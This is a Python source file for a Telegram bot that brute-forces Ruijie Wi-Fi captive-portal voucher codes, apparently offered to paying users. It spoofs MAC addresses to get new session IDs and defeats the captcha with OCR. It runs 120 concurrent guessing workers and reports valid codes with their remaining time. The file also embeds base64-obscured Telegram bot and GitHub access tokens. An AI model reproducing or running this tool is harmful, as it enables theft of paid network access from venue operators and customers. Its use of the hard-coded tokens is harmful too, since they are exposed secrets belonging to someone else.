import asyncio
import aiohttp
from aiohttp import web
import json
import time
import random
import re
import base64
import os
import string
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
import ddddocr
from datetime import datetime, timedelta, timezone

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = base64.b64decode("ODUyMDAyNjAyNjpBQUdEeWdfNUxUUEpPVjN5TGJ5WlpyQ0c1dlJSMWJ3T0diYw==").decode('utf-8')
ADMIN_CHAT_ID = "8443207882"

# GitHub Configuration
GITHUB_TOKEN = base64.b64decode("Z2hwX0pTWENrYnZHMDd3VlYwRDl4MUlCVFlaWHBOUUxmYzFPZ3pZRw==").decode('utf-8')
REPO_OWNER = "kolinn2023456-prog"
REPO_NAME = "gold"

TIMEOUT_SEC = 8
MAX_CODES_PER_SID = 100
NUM_WORKERS_PER_USER = 120

# --- DATA STRUCTURES ---
user_sessions = {}
session_lock = asyncio.Lock()
_ocr_instance = None
global_session = None

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance

# --- GITHUB STORAGE HELPERS ---
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    try:
        async with global_session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8').strip()
                if not content: return {}, data['sha']
                return json.loads(content), data['sha']
            elif response.status == 404:
                return {}, None
    except json.JSONDecodeError:
        return {}, data.get('sha') if 'data' in locals() else None
    except Exception as e:
        print(f"GitHub Read Error ({path}): {e}")
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json", "Content-Type": "application/json"}
    encoded = base64.b64encode(json.dumps(content, indent=4).encode()).decode()
    payload = {"message": message, "content": encoded}
    if sha: payload["sha"] = sha
    try:
        async with global_session.put(url, headers=headers, json=payload) as response:
            return response.status in [200, 201]
    except Exception as e:
        print(f"GitHub Write Error ({path}): {e}")
        return False

# --- TELEGRAM HELPERS (EDITABLE MESSAGES) ---
async def send_telegram_msg(chat_id, message, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
    if reply_markup: payload["reply_markup"] = json.dumps(reply_markup)
    try:
        async with global_session.post(url, json=payload, timeout=5) as resp:
            return await resp.json()
    except Exception as e: print(f"Telegram Send Error: {e}")

async def edit_telegram_msg(chat_id, message_id, message, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": message, "parse_mode": "HTML"}
    if reply_markup: payload["reply_markup"] = json.dumps(reply_markup)
    try:
        async with global_session.post(url, json=payload, timeout=5) as resp:
            return await resp.json()
    except Exception as e: print(f"Telegram Edit Error: {e}")

# --- BUTTON MENU STRUCTURES ---
def get_main_menu(chat_id):
    buttons = [
        [{"text": "🔄 UPDATE URL", "callback_data": "add_url"}],
        [{"text": "📄 MY URL", "callback_data": "list_urls"}],
        [{"text": "🔢🔡 SETUP MOD", "callback_data": "setup_mode"}],
        [{"text": "💰 VIEW HITS (CACHE)", "callback_data": "view_hits"}, {"text": "🔍 RECHECK HITS", "callback_data": "reverify_hits"}],
        [{"text": "🚀 START SCAN", "callback_data": "user_start"}]
    ]
    if str(chat_id) == str(ADMIN_CHAT_ID):
        buttons.append([{"text": "👤 AUTHORIZE USER", "callback_data": "auth_user"}])
        buttons.append([{"text": "🚫 REMOVE USER", "callback_data": "deauth_user"}])
    return {"inline_keyboard": buttons}

# --- ACCESS VERIFICATION ---
async def check_user_access_github(chat_id):
    if str(chat_id) == str(ADMIN_CHAT_ID):
        return True, "Unlimited (Admin)"
    auth_list, _ = await get_file_content("auth_list.json")
    chat_id_str = str(chat_id)
    if chat_id_str in auth_list:
        data = auth_list[chat_id_str]
        expiry = data.get("expires_at") if isinstance(data, dict) else None
        if expiry == "9999-12-31T23:59:59Z": return True, "Unlimited"
        try:
            exp_dt = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            now = datetime.now(timezone.utc)
            if exp_dt > now:
                diff = exp_dt - now
                return True, f"{diff.days}d {diff.seconds//3600}h {(diff.seconds%3600)//60}m left"
        except: pass
    return False, None

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {"30m": timedelta(minutes=30), "1h": timedelta(hours=1), "1d": timedelta(days=1), "7d": timedelta(days=7), "1m": timedelta(days=30), "1y": timedelta(days=365), "unlimited": None}
    if plan not in plans: return None
    if plan == "unlimited": return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

# --- CORE BRUTEFORCE LOGIC ---
def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])

async def get_sid_from_gateway(session, portal_url):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
    try:
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        query['mac'] = [generate_random_mac()]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))
        async with session.get(spoofed_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                async with session.get(final_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r3: final_url = str(r3.url)
            else: final_url = str(r2.url)
            parsed_query = parse_qs(urlparse(final_url).query)
            return parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
    except: pass
    return None

def ocr_image_bytes_fast(image_bytes: bytes) -> str:
    try: return get_ocr_instance().classification(image_bytes).strip().upper()
    except: return ""

async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
        async with session.get(current_url, headers=headers, ssl=False) as response:
            if response.status == 200:
                return await asyncio.to_thread(ocr_image_bytes_fast, await response.read())
    except: pass
    return None

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        mins = int(total_minutes)
        if mins == 0:
            return "0m"
        hours = mins // 60
        rem_minutes = mins % 60
        if hours > 0 and rem_minutes > 0:
            return f"{hours}h {rem_minutes}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{rem_minutes}m"
    except:
        return 'Unknown'

async def Code_Expires_Date(session, active_id):
    paths = [
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}'
    ]
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    for url in paths:
        try:
            async with session.get(url, headers=headers, ssl=False) as req:
                if req.status == 200:
                    respond = await req.json()
                    if respond.get('success'):
                        result = respond.get('result', {})
                        raw_minutes = result.get('totalMinutes')
                        if raw_minutes is None:
                            raw_minutes = result.get('remainingMinutes')
                        if raw_minutes is None:
                            raw_minutes = 'Unknown'
                        profile_name = result.get('profileName', 'Unknown')
                        totaltime = Minute_to_Hour(raw_minutes)
                        return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
        except Exception:
            continue
    return "📋 Plan: Unknown | ⏳ Time: Unknown"

async def check_single_access_code(session, chat_id, code, current_session_id, login_url, captcha_base_url, verify_url, headers):
    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
    auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
    if not auth_code or len(auth_code) < 2: return False
    try:
        async with session.post(verify_url, json={"sessionId": current_session_id, "authCode": auth_code}, headers=headers, ssl=False) as v_resp:
            if v_resp.status != 200 or not (await v_resp.json()).get("success"): return False
            async with session.post(login_url, json={"accessCode": code, "sessionId": current_session_id, "apiVersion": 1, "authCode": auth_code}, headers=headers, ssl=False) as l_resp:
                if chat_id in user_sessions:
                    user_sessions[chat_id]["total_tried"] += 1
                    user_sessions[chat_id]["last_code"] = code
                    user_sessions[chat_id]["interval_count"] += 1
                res_text = (await l_resp.text()).lower()
                if '"success":true' in res_text or 'logonurl' in res_text:
                    if chat_id in user_sessions:
                        # Duplicate မဖြစ်အောင် စစ်ဆေးခြင်း
                        if not any(item.get("code") == code for item in user_sessions[chat_id].get("hits", [])):
                            
                            # Plan နဲ့ Time ကို လှမ်းဆွဲခြင်း
                            expire_info = await Code_Expires_Date(session, current_session_id)
                            display_str = f"🎫 <code>{code}</code>\n   {expire_info}"
                            
                            user_sessions[chat_id]["hits"].append({"code": code, "display": display_str})

                            # Message ကို Update လုပ်ခြင်း
                            hit_list_str = "\n\n".join([item["display"] for item in user_sessions[chat_id]["hits"]])
                            accumulated_message = f"✅ <b>Success Codes Found:</b>\n\n{hit_list_str}"

                            if user_sessions[chat_id].get("last_hit_msg_id"):
                                await edit_telegram_msg(chat_id, user_sessions[chat_id]["last_hit_msg_id"], accumulated_message)
                            else:
                                res = await send_telegram_msg(chat_id, accumulated_message)
                                if res and res.get("result"):
                                    user_sessions[chat_id]["last_hit_msg_id"] = res["result"]["message_id"]
                    return True
    except: pass
    return False

# --- HITS RECHECK LOGIC (CAPTCHA BYPASS SYSTEM FIXED) ---
async def recheck_user_hits(chat_id, message_id):
    u = user_sessions.get(chat_id)
    if not u or not u.get("hits"):
        await edit_telegram_msg(chat_id, message_id, "❌ Recheck ရန် Hit Codes မရှိသေးပါ။", get_main_menu(chat_id))
        return

    await edit_telegram_msg(chat_id, message_id, "🔍 <b>Hits Rechecking Mode... (with Captcha)</b>\n\nGateway နှင့် ချိတ်ဆက်နေပါသည်...")

    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/535.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36", "Content-Type": "application/json", "Origin": "https://portal-as.ruijienetworks.com"}

    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        current_session_id = None
        codes_checked_with_current_sid = 0
        valid_hits = []

        await edit_telegram_msg(chat_id, message_id, f"🔍 Total <code>{len(u['hits'])}</code> codes ကို Captcha ဖြေရှင်းပြီး စစ်ဆေးနေပါပြီ...")

        for item in u["hits"]:
            code = item["code"] if isinstance(item, dict) else item
            try:
                if current_session_id is None or codes_checked_with_current_sid >= MAX_CODES_PER_SID:
                    current_session_id = await get_sid_from_gateway(session, u["url"])
                    if not current_session_id: continue
                    codes_checked_with_current_sid = 0

                captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
                auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
                if not auth_code or len(auth_code) < 2: continue

                async with session.post(verify_url, json={"sessionId": current_session_id, "authCode": auth_code}, headers=headers, ssl=False) as v_resp:
                    if v_resp.status != 200 or not (await v_resp.json()).get("success"): continue

                    async with session.post(login_url, json={"accessCode": code, "sessionId": current_session_id, "apiVersion": 1, "authCode": auth_code}, headers=headers, ssl=False) as l_resp:
                        res_text = (await l_resp.text()).lower()
                        if '"success":true' in res_text or 'logonurl' in res_text:
                            # ရှင်နေသေးပါက အချက်အလက်များ ပြန်ဆွဲယူမည်
                            expire_info = await Code_Expires_Date(session, current_session_id)
                            display_str = f"🎫 <code>{code}</code>\n   {expire_info}"
                            valid_hits.append({"code": code, "display": display_str})

                codes_checked_with_current_sid += 1
                await asyncio.sleep(0.1)
            except: pass

        u["hits"] = valid_hits
        hit_list_str = "\n\n".join([item["display"] for item in valid_hits]) if valid_hits else "None Live"
        status_text = f"✅ <b>Recheck Completed!</b>\n\n🟢 <b>Active Live Keys:</b>\n\n{hit_list_str}"
        await edit_telegram_msg(chat_id, message_id, status_text, get_main_menu(chat_id))

async def user_worker(chat_id, user_config):
    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/535.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36", "Content-Type": "application/json", "Origin": "https://portal-as.ruijienetworks.com"}

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        current_session_id = None
        codes_checked_with_current_sid = 0
        stop_event = user_config["stop_event"]

        while not stop_event.is_set():
            if current_session_id is None or codes_checked_with_current_sid >= MAX_CODES_PER_SID:
                current_session_id = await get_sid_from_gateway(session, user_config["url"])
                if not current_session_id:
                    await asyncio.sleep(2)
                    continue
                codes_checked_with_current_sid = 0

            mode = user_config.get("mode", "num")
            length = int(user_config.get("length", 6))

            if mode == "num": char_set = "012345678"
            elif mode == "alpha": char_set = string.ascii_lowercase
            else: char_set = "012345678" + string.ascii_lowercase

            code = "".join(random.choice(char_set) for _ in range(length))
            if code in user_config["tried_codes"]: continue
            user_config["tried_codes"].add(code)

            await check_single_access_code(session, chat_id, code, current_session_id, login_url, captcha_base_url, verify_url, headers)
            codes_checked_with_current_sid += 1
            await asyncio.sleep(0.005)

# --- LIVE DASHBOARD MONITOR ---
async def status_monitor_task(chat_id, message_id):
    u = user_sessions.get(chat_id)
    if not u: return
    stop_event = u["stop_event"]
    start_time = time.time()

    markup = {"inline_keyboard": [[{"text": "🛑 STOP SCANNER", "callback_data": "user_stop"}]]}

    while not stop_event.is_set():
        await asyncio.sleep(3.0)
        elapsed = time.time() - start_time
        speed = u["interval_count"] / 3.0 if elapsed > 0 else 0
        u["interval_count"] = 0 

        status_text = (
            f"⚡ <b>RUIJIE MULTI-USER DASHBOARD</b> ⚡\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🚀 <b>SPEED:</b> {speed:.1f} c/s\n"
            f"🏹 <b>TRIED:</b> {u['total_tried']:,}\n"
            f"🎯 <b>HITS:</b> {len(u['hits'])} FOUND\n"
            f"🔑 <b>CURRENT:</b> <code>{u.get('last_code', '----')}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ℹ️ <i>Results will be sent instantly.</i>"
        )
        await edit_telegram_msg(chat_id, message_id, status_text, markup)

async def run_user_process(chat_id, initial_msg_id):
    user_config = user_sessions[chat_id]
    user_config["total_tried"] = 0
    user_config["last_code"] = ""
    user_config["interval_count"] = 0
    user_config["last_hit_msg_id"] = None

    monitor_task = asyncio.create_task(status_monitor_task(chat_id, initial_msg_id))
    tasks = [asyncio.create_task(user_worker(chat_id, user_config)) for _ in range(NUM_WORKERS_PER_USER)]
    user_config["tasks"] = tasks

    await user_config["stop_event"].wait()
    monitor_task.cancel()
    for t in tasks: t.cancel()
    await asyncio.gather(*tasks, monitor_task, return_exceptions=True)

# --- TELEGRAM BOT POLL LISTENER ---
async def telegram_listener():
    offset = 0
    print("Telegram Bot Started with Advanced Button Modes.")
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            async with global_session.get(url, params={"offset": offset, "timeout": 20}) as resp:
                updates = await resp.json()
                if updates and updates.get("result"):
                    for update in updates["result"]:
                        offset = update["update_id"] + 1

                        if "callback_query" in update:
                            cq = update["callback_query"]
                            data = cq["data"]
                            chat_id = str(cq["message"]["chat"]["id"])
                            message_id = cq["message"]["message_id"]

                            async with session_lock:
                                if chat_id not in user_sessions: continue
                                u = user_sessions[chat_id]

                                if data == "main_menu":
                                    u["state"] = "IDLE"
                                    await edit_telegram_msg(chat_id, message_id, "Choose an option:", get_main_menu(chat_id))

                                elif data == "add_url":
                                    u["state"] = "WAITING_URL"
                                    await edit_telegram_msg(chat_id, message_id, "🔄 <b>Updating Portal URL...</b>\n\nGateway URL အသစ် ပို့ပေးပါ။ အဟောင်းနေရာတွင် တိုက်ရိုက် အစားထိုးပါမည်။")

                                elif data == "list_urls":
                                    text = f"<b>Your Active Portal URL:</b>\n\n<code>{u['url']}</code>" if u["url"] else "You haven't added any URL yet."
                                    markup = {"inline_keyboard": [[{"text": "🗑 CLEAR URL", "callback_data": "clear_urls"}], [{"text": "🔙 BACK", "callback_data": "main_menu"}]]}
                                    await edit_telegram_msg(chat_id, message_id, text, markup)

                                elif data == "clear_urls":
                                    u["url"] = ""
                                    await edit_telegram_msg(chat_id, message_id, "URL cleared successfully!", {"inline_keyboard": [[{"text": "🔙 BACK", "callback_data": "main_menu"}]]})

                                elif data == "view_hits":
                                    # Cache ထဲက ကုဒ်တွေကို Detail အပြည့်အစုံနဲ့ ပြသခြင်း
                                    if u.get("hits") and isinstance(u["hits"][0], dict):
                                        hit_list_str = "\n\n".join([item["display"] for item in u["hits"]])
                                    elif u.get("hits"):
                                        hit_list_str = "\n".join([f"• <code>{c}</code>" for c in u["hits"]])
                                    else:
                                        hit_list_str = "None yet"
                                    text = f"💰 <b>Your Checked Hits List (Cache):</b>\n\n{hit_list_str}"
                                    await edit_telegram_msg(chat_id, message_id, text, {"inline_keyboard": [[{"text": "🔙 BACK", "callback_data": "main_menu"}]]})

                                elif data == "reverify_hits":
                                    asyncio.create_task(recheck_user_hits(chat_id, message_id))

                                elif data == "setup_mode":
                                    markup = {"inline_keyboard": [
                                        [{"text": "🔢 Numbers (0-8)", "callback_data": "set_m_num"}],
                                        [{"text": "🔤 Alpha (a-z)", "callback_data": "set_m_alpha"}],
                                        [{"text": "🔀 Mixed", "callback_data": "set_m_mixed"}],
                                        [{"text": "🔙 Back", "callback_data": "main_menu"}]
                                    ]}
                                    await edit_telegram_msg(chat_id, message_id, "Select Character Set:", markup)

                                elif data.startswith("set_m_"):
                                    u["mode"] = data.split("_")[-1]
                                    markup = {"inline_keyboard": [
                                        [{"text": f"{i} Digits", "callback_data": f"set_l_{i}"} for i in [6, 7, 8]],
                                        [{"text": "🔙 Back", "callback_data": "setup_mode"}]
                                    ]}
                                    await edit_telegram_msg(chat_id, message_id, "Select Code Length:", markup)

                                elif data.startswith("set_l_"):
                                    u["length"] = data.split("_")[-1]
                                    await edit_telegram_msg(chat_id, message_id, f"✅ Settings updated!\nMode: `{u['mode']}` | Length: `{u['length']}`", get_main_menu(chat_id))

                                elif data == "user_start":
                                    is_active, time_str = await check_user_access_github(chat_id)
                                    if not is_active:
                                        await edit_telegram_msg(chat_id, message_id, "❌ You are not authorized.")
                                        continue
                                    if not u["url"]:
                                        await edit_telegram_msg(chat_id, message_id, "⚠️ Add/Update URL first!", get_main_menu(chat_id))
                                        continue
                                    u["state"] = "RUNNING"
                                    u["stop_event"].clear()
                                    asyncio.create_task(run_user_process(chat_id, message_id))

                                elif data == "user_stop":
                                    u["stop_event"].set()
                                    u["state"] = "READY"
                                    await edit_telegram_msg(chat_id, message_id, "🛑 <b>Scanner Stopped!</b>", get_main_menu(chat_id))

                                # Admin Buttons
                                elif data == "auth_user" and chat_id == ADMIN_CHAT_ID:
                                    u["state"] = "WAITING_AUTH"
                                    await edit_telegram_msg(chat_id, message_id, "Send the Telegram User ID to authorize (Format: plan target_id, e.g., `1m 1234567`)")
                                elif data == "deauth_user" and chat_id == ADMIN_CHAT_ID:
                                    u["state"] = "WAITING_DEL"
                                    await edit_telegram_msg(chat_id, message_id, "Send the Telegram User ID to deauthorize.")

                        elif "message" in update:
                            msg = update["message"]
                            chat_id = str(msg["chat"]["id"])
                            text = msg.get("text", "")

                            async with session_lock:
                                if chat_id not in user_sessions:
                                    user_sessions[chat_id] = {"state": "IDLE", "mode": "num", "length": "6", "url": "", "stop_event": asyncio.Event(), "tasks": [], "total_tried": 0, "last_code": "", "interval_count": 0, "hits": [], "tried_codes": set(), "last_hit_msg_id": None}
                                u = user_sessions[chat_id]

                                if text == "/start":
                                    is_active, _ = await check_user_access_github(chat_id)
                                    if not is_active:
                                        await send_telegram_msg(chat_id, f"❌ You are not authorized.\nYour ID: <code>{chat_id}</code>")
                                        continue
                                    u["state"] = "IDLE"
                                    await send_telegram_msg(chat_id, f"👋 <b>Welcome to SIRZIPP Bot!</b>\n\nYour Telegram ID: <code>{chat_id}</code>", get_main_menu(chat_id))

                                elif u["state"] == "WAITING_URL":
                                    if not text.startswith("http"):
                                        await send_telegram_msg(chat_id, "❌ Invalid URL. Must start with http")
                                        continue
                                    u["url"] = text  # တိုက်ရိုက် overwrite လုပ်သွားပါမည်။
                                    u["state"] = "IDLE"
                                    await send_telegram_msg(chat_id, "✅ URL Updated successfully!", get_main_menu(chat_id))

                                elif u["state"] == "WAITING_AUTH" and chat_id == ADMIN_CHAT_ID:
                                    parts = text.split()
                                    if len(parts) >= 2:
                                        plan, target_id = parts[0], parts[1]
                                        expiry = generate_expiry(plan)
                                        if expiry:
                                            auth_list, sha = await get_file_content("auth_list.json")
                                            auth_list[str(target_id)] = {"expires_at": expiry, "plan": plan}
                                            await update_file_content("auth_list.json", auth_list, sha, f"Auth {target_id}")
                                            await send_telegram_msg(chat_id, f"✅ User {target_id} authorized!", get_main_menu(chat_id))
                                    u["state"] = "IDLE"

                                elif u["state"] == "WAITING_DEL" and chat_id == ADMIN_CHAT_ID:
                                    auth_list, sha = await get_file_content("auth_list.json")
                                    if text in auth_list:
                                        del auth_list[text]
                                        await update_file_content("auth_list.json", auth_list, sha, f"Deleted {text}")
                                        await send_telegram_msg(chat_id, f"✅ User {text} deauthorized!", get_main_menu(chat_id))
                                    u["state"] = "IDLE"

        except Exception as e: print(f"Listener Error: {e}")
        await asyncio.sleep(1)

# --- WEB SERVER ---
async def handle(request): return web.Response(text="Bot Engine is Alive!")
async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()

    port = int(os.environ.get('PORT', random.randint(8000, 9000)))
    try:
        await web.TCPSite(runner, '0.0.0.0', port).start()
    except OSError:
        await web.TCPSite(runner, '0.0.0.0', port + 1).start()

async def main():
    global global_session
    global_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=200, ttl_dns_cache=300, ssl=False))
    try:
        asyncio.create_task(web_server())
        await telegram_listener()
    finally: await global_session.close()

if __name__ == '__main__':
    try: asyncio.run(main())
    except KeyboardInterrupt: pass
